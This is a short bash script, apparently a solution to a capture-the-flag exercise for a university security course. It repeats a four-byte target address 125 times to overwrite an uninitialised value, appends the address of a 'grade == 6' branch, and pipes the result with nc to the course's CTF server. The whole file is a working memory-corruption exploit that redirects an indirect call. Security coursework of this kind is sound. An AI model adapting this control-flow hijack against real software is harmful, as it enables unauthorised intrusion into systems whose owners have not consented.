#!/bin/bash

target=$'\xfc\xf6\x0e\x08' #where to write -> value of q1 because not initialized
                           #call *-0x1908(%ebx, %esi, 4) instruction at the end of main

address=134515134 #what to call 134515134 = 0x080489be address after grade == 6

payload=$''

for i in {1..125}
do

payload=$payload$target


done

newline=$'\n'

echo -e $payload$newline$address | nc cs412-ctf.epfl.ch 10006
